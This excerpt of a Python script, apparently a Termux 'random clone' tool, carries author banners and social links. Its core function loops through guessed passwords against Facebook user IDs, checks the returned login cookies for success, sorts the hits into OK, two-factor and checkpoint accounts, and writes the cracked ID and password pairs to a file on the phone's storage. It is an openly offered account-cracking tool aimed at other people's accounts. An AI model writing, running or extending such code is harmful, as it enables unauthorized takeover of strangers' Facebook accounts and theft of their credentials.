...
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mADNAN WASIF SHAKIL\033[1;31m│

\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32ADNAN WASIF SHAKIL\033[1;31m     │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mADNAN-143           \033[1;31m │
...
def my_tool_security():
    ...
    print("\t  Facebook : ADNAN WASIF SHAKIL")

    print("\t  Fb page  : Feeling Sad")

    print("\t  Github   : ADNAN-143")
...
def xyz():
    ...
    os.system("play-audio WELCOME_TO_ADNAN_RANDOM_CLONE_TOOL.mp3")
    ...
    if hamii in ["1","01"]:
        ...
        os.system("https://www.facebook.com/jonising.com12");xyz()

    elif hamii in ["4","04"]:

        os.system("xdg-open https://wa.me/+8801758329292")
...
def password():
    ...
    passX = input(f" {RED}CHOOSE{ADNAN2} : ")
...
def free1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                os.system("play-audio ADNAN_OK.mp3")

                print('\r\033[1;32m[ADNAN-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    os.system("play-audio ADNAN_2F.mp3")

                    print('\r\033[1;34m[ADNAN-2F] '+uid+' [~] '+ps+' ')

                    open('/sdcard/ADNAN-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    ...
                    os.system("play-audio ADNAN_CP.mp3")

                    print(f'\r\033[1;30m[ADNAN-CP] '+uid+' [×] '+ps+ ' ')
        ...
        sys.stdout.write(f'\r\33[1;37m[ADNAN 🔥] [%s] \33[1;97m[OK:%s{ADNAN2}CP:%s]'%(loop,len(ok),len(cp))), 
